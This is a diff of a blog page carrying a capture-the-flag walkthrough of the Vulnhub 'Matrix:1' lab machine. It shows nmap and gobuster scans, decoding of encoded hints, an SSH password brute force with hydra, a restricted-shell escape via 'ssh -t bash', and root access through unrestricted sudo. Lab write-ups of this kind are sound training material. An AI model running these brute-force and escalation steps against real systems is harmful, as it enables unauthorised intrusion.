@@ -1,6 +1,66 @@
-<!doctype html><html lang=en-us><head><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script><meta charset=utf-8><title>Matrix:1 Vulnhub Walkthrough</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta name=author content="Nasef"><meta name=generator content="Hugo 0.85.0"><link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css><link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css><link href=https://iamnasef.com/scss/style.min.css rel=stylesheet><link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon><link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon></head><body><nav class="navbar navbar-expand-lg site-navigation"><div class=container><a class=navbar-brand href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo.png alt=logo></a>
+<!doctype html><html lang=en-us><head>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script>
+<meta charset=utf-8>
+<title>Matrix:1 Vulnhub Walkthrough</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=author content="Nasef">
+<meta name=generator content="Hugo 0.86.0">
+<link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
+<link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
+<link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
+<link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon>
+</head><body><nav class="navbar navbar-expand-lg site-navigation">
+<div class=container>
+<a class=navbar-brand href=https://iamnasef.com/>
+<img src=https://iamnasef.com/images/logo.png alt=logo>
+</a>
 <button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
-<span class=icon-bar></span><span class=icon-bar></span><span class=icon-bar></span></button><div class="collapse navbar-collapse" id=sitenavbar><ul class="navbar-nav ml-auto main-nav"><li class=nav-item><a class=nav-link href=https://iamnasef.com/>Home</a></li><li class=nav-item><a class=nav-link href=https://iamnasef.com/projects>Projects</a></li><li class=nav-item><a class=nav-link href=https://iamnasef.com/courses>Courses</a></li><li class=nav-item><a class=nav-link href=https://iamnasef.com/blog>Blog</a></li><li class=nav-item><a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact><span class=btn-area><span data-text="Contact Me">Contact Me</span></span></a></li></ul></div></div></nav><main><section class="site-blog details"><div class=container><div class="row justify-content-center"><div class=col-lg-8><article class=site-blog-details><p><span>September 25, 2020</span> by <span>Nasef</span></p><h2 class=blog-title>Matrix:1 Vulnhub Walkthrough</h2><img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image><p>Matrix:1 is a machine in which I used Enumeration to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p><h2 id=scanning>Scanning</h2><p>As always, I started scanning with Nmap</p><pre><code>root@kali:/home/kali# nmap -sC -sV 192.168.198.139
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<div class="collapse navbar-collapse" id=sitenavbar>
+<ul class="navbar-nav ml-auto main-nav">
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/>Home</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/projects>Projects</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/courses>Courses</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/blog>Blog</a>
+</li>
+<li class=nav-item>
+<a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact>
+<span class=btn-area>
+<span data-text="Contact Me">
+Contact Me
+</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<section class="site-blog details">
+<div class=container>
+<div class="row justify-content-center">
+<div class=col-lg-8>
+<article class=site-blog-details>
+<p><span>September 25, 2020</span> by <span>Nasef</span></p>
+<h2 class=blog-title>Matrix:1 Vulnhub Walkthrough</h2>
+<img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image>
+<p>Matrix:1 is a machine in which I used Enumeration to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p>
+<h2 id=scanning>Scanning</h2>
+<p>As always, I started scanning with Nmap</p>
+<pre><code>root@kali:/home/kali# nmap -sC -sV 192.168.198.139
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 00:30 EDT
 Nmap scan report for 192.168.198.139
 Host is up (0.000096s latency).
@@ -20,7 +80,10 @@ MAC Address: 00:0C:29:43:C6:92 (VMware)
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds
-</code></pre><p>Interesting two http services!</p><h2 id=web-enumeration>Web Enumeration</h2><p>Then I enumerated directories and files using gobuster on both services but there is no useful information</p><pre><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.139 -x php,html,json,py,matrix
+</code></pre><p>Interesting two http services!</p>
+<h2 id=web-enumeration>Web Enumeration</h2>
+<p>Then I enumerated directories and files using gobuster on both services but there is no useful information</p>
+<pre><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.139 -x php,html,json,py,matrix
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -50,9 +113,24 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 2020/09/25 01:14:21 Finished                                                                                      
 ===============================================================
 
-</code></pre><p>Nothing really important here.</p><h2 id=inspecting-element>Inspecting Element</h2><p>So, I started digging in the http services in port 80 and 3117. I found a base64 encoded text while inspecting element on port 31337.</p><p><img src=/images/blog/002/1.png alt=Username></p><h2 id=cracking>Cracking</h2><p>After decoding</p><p><img src=/images/blog/002/2.png alt=Username></p><p>so I visted http://192.168.198.139:1337/Cypher.matrix , a filed was downloaded which contained this strange ciphertext</p><p><img src=/images/blog/002/3.png alt=Username></p><p>I used online crypto Identifier and the text was identified as Brainfuck Endcoding</p><p><img src=/images/blog/002/4.png alt=Username></p><p>So I used another online tool to decode the text</p><p><img src=/images/blog/002/5.png alt=Username></p><p>The text contains our password with missing two letters so I used an online combination
+</code></pre><p>Nothing really important here.</p>
+<h2 id=inspecting-element>Inspecting Element</h2>
+<p>So, I started digging in the http services in port 80 and 3117. I found a base64 encoded text while inspecting element on port 31337.</p>
+<p><img src=/images/blog/002/1.png alt=Username></p>
+<h2 id=cracking>Cracking</h2>
+<p>After decoding</p>
+<p><img src=/images/blog/002/2.png alt=Username></p>
+<p>so I visted http://192.168.198.139:1337/Cypher.matrix , a filed was downloaded which contained this strange ciphertext</p>
+<p><img src=/images/blog/002/3.png alt=Username></p>
+<p>I used online crypto Identifier and the text was identified as Brainfuck Endcoding</p>
+<p><img src=/images/blog/002/4.png alt=Username></p>
+<p>So I used another online tool to decode the text</p>
+<p><img src=/images/blog/002/5.png alt=Username></p>
+<p>The text contains our password with missing two letters so I used an online combination
 maker and prefix adder to make my wordlist
-<img src=/images/blog/002/6.png alt=Username></p><p>Then I used hydra to bruteforce the ssh password</p><pre><code>hydra -f -l guest -P Downloads/output.txt ssh://192.168.198.139
+<img src=/images/blog/002/6.png alt=Username></p>
+<p>Then I used hydra to bruteforce the ssh password</p>
+<pre><code>hydra -f -l guest -P Downloads/output.txt ssh://192.168.198.139
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 01:13:47
@@ -67,15 +145,19 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 01:13:
 [STATUS] attack finished for 192.168.198.139 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-25 01:21:21
-</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2><p>When I sshed to the user guest, it gave me a restricted shell so I bypassed the restriction by using this command</p><pre><code>root@kali:/home/kali# ssh guest@192.168.198.139 -t bash
+</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2>
+<p>When I sshed to the user guest, it gave me a restricted shell so I bypassed the restriction by using this command</p>
+<pre><code>root@kali:/home/kali# ssh guest@192.168.198.139 -t bash
 
-</code></pre><p>I ran diffreent Enumeration scripts and found an intersting sudo privilege which allows us to run all commands</p><pre><code>guest@porteus:/tmp$ sudo -l
+</code></pre><p>I ran diffreent Enumeration scripts and found an intersting sudo privilege which allows us to run all commands</p>
+<pre><code>guest@porteus:/tmp$ sudo -l
 User guest may run the following commands on porteus:
     (ALL) ALL
     (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
     (trinity) NOPASSWD: /bin/cp
 
-</code></pre><p>So</p><pre><code>guest@porteus:/tmp$ sudo su
+</code></pre><p>So</p>
+<pre><code>guest@porteus:/tmp$ sudo su
 Password: 
 root@porteus:/tmp# cat /root/flag.txt 
    _,-.                                                             
@@ -89,7 +171,86 @@ root@porteus:/tmp# cat /root/flag.txt
          jrei | |    _,'                                            
               '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    
 
-</code></pre><p>and voila here is the root privilege!</p></article></div></div></div></section><section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)><div class=container><div class=row><div class="col-12 text-center"><h1 class=site-cta-title>SAY HELLO</h1><a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a><div class=sm-links><a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+</code></pre><p>and voila here is the root privilege!</p>
+</article>
+</div>
+</div>
+</div>
+</section>
+<section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)>
+<div class=container>
+<div class=row>
+<div class="col-12 text-center">
+<h1 class=site-cta-title>SAY HELLO</h1>
+<a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a>
+<div class=sm-links>
+<a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
 <a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
 <a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
-<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a></div></div></div></div></section></main><footer class=site-footer><div class=container><div class=row><div class=col-12><div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div></div><div class="col-lg-3 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Contact Info</h5><p class=site-footer-widget-description><a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a></p></div></div><div class="col-lg-2 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Check it</h5><ul class=site-footer-widget-links><li><a href=https://iamnasef.com/blog>Blog</a></li><li><a href=https://iamnasef.com/projects>Projects</a></li><li><a href=https://iamnasef.com/courses>Courses</a></li><li><a href=https://iamnasef.com/contact>Contact</a></li></ul></div></div><div class="col-lg-2 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Social Media</h5><ul class=site-footer-widget-links><li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li><li><a href=https://twitter.com/iamnasef>Twitter</a></li><li><a href=https://github.com/iamnasef>Github</a></li><li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li></ul></div></div><div class="col-lg-3 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Keeping you safe</h5><p class=site-footer-widget-description>Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness</p></div></div><div class="col-lg-2 col-12"><a href=#top class=site-footer-widget-top><img src=https://iamnasef.com/images/to-top.svg alt=back-to-top><p>I want to<br>visit again</p></a></div></div></div></footer><script src=https://iamnasef.com/js/formhandler.min.js></script><script src=https://iamnasef.com/js/vendor.min.js></script><script src=https://iamnasef.com/js/script.min.js></script></body></html>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main><footer class=site-footer>
+<div class=container>
+<div class=row>
+<div class=col-12>
+<div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Contact Info</h5>
+<p class=site-footer-widget-description>
+<a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a>
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Check it</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://iamnasef.com/blog>Blog</a></li>
+<li><a href=https://iamnasef.com/projects>Projects</a></li>
+<li><a href=https://iamnasef.com/courses>Courses</a></li>
+<li><a href=https://iamnasef.com/contact>Contact</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Social Media</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li>
+<li><a href=https://twitter.com/iamnasef>Twitter</a></li>
+<li><a href=https://github.com/iamnasef>Github</a></li>
+<li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Keeping you safe</h5>
+<p class=site-footer-widget-description>
+Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-12">
+<a href=#top class=site-footer-widget-top>
+<img src=https://iamnasef.com/images/to-top.svg alt=back-to-top>
+<p>
+I want to
+<br>
+visit again
+</p>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://iamnasef.com/js/formhandler.min.js></script>
+<script src=https://iamnasef.com/js/vendor.min.js></script>
+<script src=https://iamnasef.com/js/script.min.js></script></body>
+</html>
